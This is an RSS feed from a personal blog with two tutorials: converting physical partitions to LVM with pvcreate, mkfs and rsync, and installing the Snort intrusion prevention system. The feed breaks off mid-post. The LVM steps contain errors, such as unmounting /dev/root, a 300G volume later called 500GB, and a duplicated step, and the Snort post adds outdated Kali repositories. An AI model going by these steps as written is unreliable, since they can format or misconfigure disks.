<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Tooling on Ally Petitt</title>
    <link>https://ally-petitt.github.io:443/en/tags/tooling/</link>
    <description>Recent content in Tooling on Ally Petitt</description>
    <generator>Hugo -- 0.125.4</generator>
    <language>en</language>
    <lastBuildDate>Sat, 19 Aug 2023 00:00:00 +0000</lastBuildDate>
    <atom:link href="https://ally-petitt.github.io:443/en/tags/tooling/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>How to safely convert to LVM without losing your data</title>
      <link>https://ally-petitt.github.io:443/en/posts/2023-08-19_how-to-safely-convert-to-lvm-without-losing-your-data-258ce044448/</link>
      <pubDate>Sat, 19 Aug 2023 00:00:00 +0000</pubDate>
      <guid>https://ally-petitt.github.io:443/en/posts/2023-08-19_how-to-safely-convert-to-lvm-without-losing-your-data-258ce044448/</guid>
      <description>&lt;h1 id=&#34;introduction&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*es1LJrnEBsSNgXZM.png&#34; alt=&#34;&#34;  /&gt;

Introduction&lt;/h1&gt;
&lt;p&gt;This article is a walkthrough that demonstrates the solution to a particular situation that computer owners may encounter when updating their system. For readers who do not fit into the scenario listed below, this is also a great article for familiarizing yourself with the practical application of logical volume manager (LVM). Otherwise, feel free to modify your approach as works best with your scenario.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Scenario:&lt;/strong&gt; You have a hard drive with all your files on it that uses physical partitions. You just bought a new hard drive and would like to use both drives together to manage logical partitions rather than physical ones. You also don’t want to lose the data that was on your original physical partitions.&lt;/p&gt;
&lt;p&gt;As implied from above, the only requirements for this approach are that you have a system that can use LVM and you have a storage device with equal or greater size than the amount of data stored on the primary storage device. Additionally, it is assumed that you are using Linux.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Warning:&lt;/strong&gt; This has the potential to cause damage and potentially brick your system. Your implementation may also vary depending on your setup. Continue at your own risk.&lt;/p&gt;
&lt;h2 id=&#34;benefits-oflvm&#34;&gt;Benefits of LVM&lt;/h2&gt;
&lt;p&gt;The full scope of LVMs capabilities can be seen &lt;a href=&#34;https://man7.org/linux/man-pages/man8/lvm.8.html&#34;&gt;here&lt;/a&gt;. It is a flexible utility that offers unique advantages over traditional physical partitions:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Grouping multiple drives into a single volume group&lt;/li&gt;
&lt;li&gt;Support for &lt;a href=&#34;https://en.wikipedia.org/wiki/Thin_provisioning&#34;&gt;thin provisioning&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Snapshot capabilities that can be used for backups&lt;/li&gt;
&lt;li&gt;Easy to resize partitions and add/remove drives&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;More detail on the benefits can be found &lt;a href=&#34;https://linuxhint.com/whatis_logical_volume_management/&#34;&gt;here&lt;/a&gt;. We are now ready to discuss the steps to convert to LVM.&lt;/p&gt;
&lt;h1 id=&#34;steps-to-safely-convert-tolvm&#34;&gt;Steps to Safely Convert to LVM&lt;/h1&gt;
&lt;p&gt;For the purpose of this article, the primary storage device used will be referred to as &lt;code&gt;sda&lt;/code&gt; and the new storage device will be called &lt;code&gt;sdb&lt;/code&gt;. An overview of the plan is the following:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Create LVM group on &lt;code&gt;sdb&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Copy data from &lt;code&gt;sda&lt;/code&gt;partitions to &lt;code&gt;sdb&lt;/code&gt; logical partitions&lt;/li&gt;
&lt;li&gt;Expand LVM group on &lt;code&gt;sdb&lt;/code&gt; to include unused &lt;code&gt;sda&lt;/code&gt; partitions&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;prerequisite&#34;&gt;Prerequisite&lt;/h2&gt;
&lt;p&gt;Install the LVM tools and &lt;code&gt;rsync&lt;/code&gt; with the command that is appropriate with your Linux distribution.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt-get install lvm2 rsync # For Ubuntu/Debian  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo pacman -Sy lvm2 rsync # Arch Linux
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol&gt;
&lt;li&gt;Create LVM group on &lt;code&gt;sdb&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;Create a volume group called &lt;code&gt;myvg&lt;/code&gt; on &lt;code&gt;sdb&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo pvcreate /dev/sdb  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo vgcreate myvg /dev/sdb
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Create a logical volume&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;Create a logical volume on the &lt;code&gt;myvg&lt;/code&gt; volume group to store the new data in. This one is named &lt;code&gt;backup&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo lvcreate -n backup -L 300G myvg
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To verify your progress, you can run the commands &lt;code&gt;sudo vgs&lt;/code&gt; and &lt;code&gt;sudo lvs&lt;/code&gt; to list the recently created volume groups and logical volumes.&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Mount the new logical volume&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;Create a filesystem. For quick creation, just press the Enter key for each of the prompts.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo mkfs.ext4 /dev/myvg/backup
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then, create a mount point and mount the &lt;code&gt;backup&lt;/code&gt; logical volume to it.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo mkdir /mnt/backup  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo mount /dev/myvg/backup /mnt/backup
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;Copy data to the logical volume&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;Then, mount the partition that you would like to transfer onto a new mount point. For instance, I would like to transfer &lt;code&gt;sda3&lt;/code&gt; onto &lt;code&gt;backup&lt;/code&gt; so I will use the following command:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo mount /dev/sda3 /mnt/root
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In this case, &lt;code&gt;rsync&lt;/code&gt; will be used to transfer the files from &lt;code&gt;sda&lt;/code&gt; to &lt;code&gt;sdb&lt;/code&gt;. In this case, the 500GB portion of &lt;code&gt;sdb&lt;/code&gt; that was used to create the &lt;code&gt;backup&lt;/code&gt; logical volume. After, I will unmount the logical volume and physical partition.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo rsync -av /mnt/root /mnt/backup  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo umount /mnt/backup  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo umount /dev/root
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Repeat steps 2–4 with all of the partitions that you with to preserve.&lt;/strong&gt;&lt;/p&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;Expand the LVM volumes&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;Now, we will add &lt;code&gt;sda2&lt;/code&gt; and &lt;code&gt;sda3&lt;/code&gt; into the volume group of LVM. In order to do this, we must initialize them as physical volumes and extend them to the volume group.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo pvcreate /dev/sdY  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo vgextend myvg /dev/sdY
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;Add new partitions to fstab&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;Finally, find the UUIDs of the new logical volumes with &lt;code&gt;lsblk -f&lt;/code&gt; and add those to your &lt;code&gt;/etc/fstab&lt;/code&gt; with the following syntax:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;UUID=&amp;lt;your-home-uuid&amp;gt; /home ext4 rw,relatime 0 2  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;UUID=&amp;lt;your-root-uuid&amp;gt; / ext4 rw,relatime 0 1
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;As always, make changes to the above configuration option if necessary.&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;These are the steps that worked for me with my setup. I hope that you found this article helpful and informative. Feel free to reach out if you have any questions.&lt;/p&gt;
</description>
      <content:encoded><![CDATA[<h1 id="introduction"><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*es1LJrnEBsSNgXZM.png" alt=""  />

Introduction</h1>
<p>This article is a walkthrough that demonstrates the solution to a particular situation that computer owners may encounter when updating their system. For readers who do not fit into the scenario listed below, this is also a great article for familiarizing yourself with the practical application of logical volume manager (LVM). Otherwise, feel free to modify your approach as works best with your scenario.</p>
<p><strong>Scenario:</strong> You have a hard drive with all your files on it that uses physical partitions. You just bought a new hard drive and would like to use both drives together to manage logical partitions rather than physical ones. You also don’t want to lose the data that was on your original physical partitions.</p>
<p>As implied from above, the only requirements for this approach are that you have a system that can use LVM and you have a storage device with equal or greater size than the amount of data stored on the primary storage device. Additionally, it is assumed that you are using Linux.</p>
<p><strong>Warning:</strong> This has the potential to cause damage and potentially brick your system. Your implementation may also vary depending on your setup. Continue at your own risk.</p>
<h2 id="benefits-oflvm">Benefits of LVM</h2>
<p>The full scope of LVMs capabilities can be seen <a href="https://man7.org/linux/man-pages/man8/lvm.8.html">here</a>. It is a flexible utility that offers unique advantages over traditional physical partitions:</p>
<ul>
<li>Grouping multiple drives into a single volume group</li>
<li>Support for <a href="https://en.wikipedia.org/wiki/Thin_provisioning">thin provisioning</a></li>
<li>Snapshot capabilities that can be used for backups</li>
<li>Easy to resize partitions and add/remove drives</li>
</ul>
<p>More detail on the benefits can be found <a href="https://linuxhint.com/whatis_logical_volume_management/">here</a>. We are now ready to discuss the steps to convert to LVM.</p>
<h1 id="steps-to-safely-convert-tolvm">Steps to Safely Convert to LVM</h1>
<p>For the purpose of this article, the primary storage device used will be referred to as <code>sda</code> and the new storage device will be called <code>sdb</code>. An overview of the plan is the following:</p>
<ol>
<li>Create LVM group on <code>sdb</code></li>
<li>Copy data from <code>sda</code>partitions to <code>sdb</code> logical partitions</li>
<li>Expand LVM group on <code>sdb</code> to include unused <code>sda</code> partitions</li>
</ol>
<h2 id="prerequisite">Prerequisite</h2>
<p>Install the LVM tools and <code>rsync</code> with the command that is appropriate with your Linux distribution.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo apt-get install lvm2 rsync # For Ubuntu/Debian  
</span></span><span style="display:flex;"><span>sudo pacman -Sy lvm2 rsync # Arch Linux
</span></span></code></pre></div><ol>
<li>Create LVM group on <code>sdb</code></li>
</ol>
<hr>
<p>Create a volume group called <code>myvg</code> on <code>sdb</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ sudo pvcreate /dev/sdb  
</span></span><span style="display:flex;"><span>$ sudo vgcreate myvg /dev/sdb
</span></span></code></pre></div><ol start="2">
<li>Create a logical volume</li>
</ol>
<hr>
<p>Create a logical volume on the <code>myvg</code> volume group to store the new data in. This one is named <code>backup</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ sudo lvcreate -n backup -L 300G myvg
</span></span></code></pre></div><p>To verify your progress, you can run the commands <code>sudo vgs</code> and <code>sudo lvs</code> to list the recently created volume groups and logical volumes.</p>
<ol start="3">
<li>Mount the new logical volume</li>
</ol>
<hr>
<p>Create a filesystem. For quick creation, just press the Enter key for each of the prompts.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo mkfs.ext4 /dev/myvg/backup
</span></span></code></pre></div><p>Then, create a mount point and mount the <code>backup</code> logical volume to it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo mkdir /mnt/backup  
</span></span><span style="display:flex;"><span>sudo mount /dev/myvg/backup /mnt/backup
</span></span></code></pre></div><ol start="4">
<li>Copy data to the logical volume</li>
</ol>
<hr>
<p>Then, mount the partition that you would like to transfer onto a new mount point. For instance, I would like to transfer <code>sda3</code> onto <code>backup</code> so I will use the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo mount /dev/sda3 /mnt/root
</span></span></code></pre></div><p>In this case, <code>rsync</code> will be used to transfer the files from <code>sda</code> to <code>sdb</code>. In this case, the 500GB portion of <code>sdb</code> that was used to create the <code>backup</code> logical volume. After, I will unmount the logical volume and physical partition.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo rsync -av /mnt/root /mnt/backup  
</span></span><span style="display:flex;"><span>sudo umount /mnt/backup  
</span></span><span style="display:flex;"><span>sudo umount /dev/root
</span></span></code></pre></div><p><strong>Repeat steps 2–4 with all of the partitions that you with to preserve.</strong></p>
<ol start="5">
<li>Expand the LVM volumes</li>
</ol>
<hr>
<p>Now, we will add <code>sda2</code> and <code>sda3</code> into the volume group of LVM. In order to do this, we must initialize them as physical volumes and extend them to the volume group.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sudo pvcreate /dev/sdY  
</span></span><span style="display:flex;"><span>sudo vgextend myvg /dev/sdY
</span></span></code></pre></div><ol start="5">
<li>Add new partitions to fstab</li>
</ol>
<hr>
<p>Finally, find the UUIDs of the new logical volumes with <code>lsblk -f</code> and add those to your <code>/etc/fstab</code> with the following syntax:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>UUID=&lt;your-home-uuid&gt; /home ext4 rw,relatime 0 2  
</span></span><span style="display:flex;"><span>UUID=&lt;your-root-uuid&gt; / ext4 rw,relatime 0 1
</span></span></code></pre></div><p>As always, make changes to the above configuration option if necessary.</p>
<h1 id="conclusion">Conclusion</h1>
<p>These are the steps that worked for me with my setup. I hope that you found this article helpful and informative. Feel free to reach out if you have any questions.</p>
]]></content:encoded>
    </item>
    <item>
      <title>Snort IPS Quickstart</title>
      <link>https://ally-petitt.github.io:443/en/posts/2023-05-02_snort-ips-quickstart-27559ae01fae/</link>
      <pubDate>Tue, 02 May 2023 00:00:00 +0000</pubDate>
      <guid>https://ally-petitt.github.io:443/en/posts/2023-05-02_snort-ips-quickstart-27559ae01fae/</guid>
      <description>&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;Snort is an open source Intrusion Prevention System (IPS) that detects malicious network traffic by comparing the network packets to a set of rules, often created by Snort and the community. Snort can be used as a packet sniffer, packet logger, and intrusion prevention system.&lt;/p&gt;
&lt;p&gt;In this article, I’ll go over some of the first steps of installing, configuring, and running Snort so that new users have a place to branch off of.&lt;/p&gt;
&lt;h1 id=&#34;quick-install&#34;&gt;Quick Install&lt;/h1&gt;
&lt;p&gt;You can install this on Ubuntu easily with the following command:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo apt-get install snort
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;kali-linux&#34;&gt;Kali Linux&lt;/h2&gt;
&lt;p&gt;For my Kali friends, you might get the message that you’re unable to locate the &lt;code&gt;snort&lt;/code&gt; package when trying to install it. This happens because the repositories that your distribution looks into when searching for apt packages doesn’t contain &lt;code&gt;snort&lt;/code&gt;. To fix this, you can try to append the following repos to your &lt;code&gt;/etc/apt/sources.list&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;deb http://http.kali.org/kali kali-rolling main non-free contrib  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;deb http://http.kali.org/kali sana main non-free contrib  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;deb http://security.kali.org/kali-security sana/updates main contrib non-free  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;deb http://old.kali.org/kali moto main non-free contrib
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let the changes take effect and install Snort.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo apt-get update  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo apt-get install snort
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;building-fromsource&#34;&gt;Building From Source&lt;/h1&gt;
&lt;p&gt;If you’re crazy enough to build Snort from the source code, this section is for you.&lt;/p&gt;
&lt;h2 id=&#34;installing-dependencies&#34;&gt;Installing Dependencies&lt;/h2&gt;
&lt;p&gt;Before you can build Snort, you must first install its dependencies. These are listed in their &lt;a href=&#34;https://github.com/snort3/snort3#dependencies&#34;&gt;README.md&lt;/a&gt; on GitHub, but for the sake of brevity, I’ll put some of them here. Keep in mind that some of the dependencies have more dependencies which is why some appear below and not in the documentation.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt update &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; apt install &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;y gcc libpcre3&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dev zlib1g&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dev libluajit&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5.1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dev   
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;libpcap&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dev openssl libssl&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dev libnghttp2&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dev libdumbnet&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dev   
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;bison flex libdnet autoconf libtool cmake
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;daq&#34;&gt;DAQ&lt;/h2&gt;
&lt;p&gt;Snort has another depenency called DAQ that needs to be installed. I’ll be downloading their latest release form GitHub and extracting it in a folder called &lt;code&gt;daq&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ wget https://github.com/snort3/libdaq/archive/refs/tags/v3.0.11.zip  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ unzip v3.0.11.zip -d daq &amp;amp;&amp;amp; cd daq/libdaq-3.0.11
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After downloading and extracting it, I’ll run &lt;code&gt;bootstrap&lt;/code&gt; to generate the configuration script and then proceed to install it.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ./bootstrap  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ./configure &amp;amp;&amp;amp; make &amp;amp;&amp;amp; sudo make install
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;hwloc&#34;&gt;hwloc&lt;/h2&gt;
&lt;p&gt;Another dependency is &lt;code&gt;hwloc&lt;/code&gt;. You can find additional methods of installation on their &lt;a href=&#34;https://github.com/open-mpi/hwloc&#34;&gt;GitHub&lt;/a&gt; and &lt;a href=&#34;https://www.open-mpi.org/software/hwloc/v2.9/&#34;&gt;website&lt;/a&gt;. This is the way that I did it:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ git clone https://github.com/open-mpi/hwloc.git  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cd hwloc &amp;amp;&amp;amp; ./autogen.sh  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ./configure &amp;amp;&amp;amp; make &amp;amp;&amp;amp; sudo make install
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;openssl&#34;&gt;OpenSSL&lt;/h2&gt;
&lt;p&gt;If you don’t already have &lt;code&gt;openssl&lt;/code&gt; installed on your system, you could install it from source:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ git clone https://github.com/openssl/openssl.git &amp;amp;&amp;amp; cd openssl  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ./Configure &amp;amp;&amp;amp; make &amp;amp;&amp;amp; make test
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It is also possible to install it through &lt;code&gt;apt&lt;/code&gt;. You may still need to install some additional headers for Snort to work. For this, you can try&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo apt install libssl-dev openssl
